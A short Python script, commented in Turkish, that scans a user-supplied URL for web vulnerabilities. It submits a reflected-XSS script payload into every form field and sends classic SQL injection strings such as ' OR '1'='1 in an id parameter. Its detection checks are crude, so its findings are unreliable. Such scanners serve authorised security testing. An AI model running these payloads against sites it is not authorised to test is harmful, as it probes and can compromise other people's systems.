import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# XSS Zafiyet Tarayıcısı:
def scan_xss(url):
    xss_payload = "<script>alert('XSS Açığı X_X')</script>"
    response = requests.get(url)
    forms = BeautifulSoup(response.text, 'html.parser').find_all('form')
    
    for form in forms:
        action = form.get('action')
        post_url = urljoin(url, action)
        method = form.get('method')

        input_fields = form.find_all('input')
        data = {}
        for input_field in input_fields:
            name = input_field.get('name')
            if name:
                data[name] = xss_payload

        if method.lower() == 'post':
            response = requests.post(post_url, data=data)
        else:
            response = requests.get(post_url, params=data)

        if xss_payload in response.text:
            print(f"[+] XSS Zafiyeti/Açığı Bulundu: {post_url}")
        else:
            print(f"[-] XSS Zafiyeti/Açığı Bulunmadı {post_url}")

# SQL Injection Zafiyet Tarayıcısı:
def scan_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", '" OR "1"="1"', "' OR '1'='1' /*"]
    for payload in sql_payloads:
        response = requests.get(f"{url}?id={payload}")
        if "SQL" in response.text or "sql" in response.text:
            print(f"[+] Payload ile SQL Zafiyeti/Açığı Bulundu: {payload}")
        else:
            print(f"[-] Payload ile SQL Zafiyeti/Açığı Bulunmadı: {payload}")

def main():
    url = input("Taranacak URL'yi Giriniz: ")
    print("\nXSS Zafiyeti/Açığı Taranıyor...")
    scan_xss(url)
    print("\nSQL Infection Zafiyeti/Açığı Taranıyor...")
    scan_sql_injection(url)

if __name__ == "__main__":
    main()
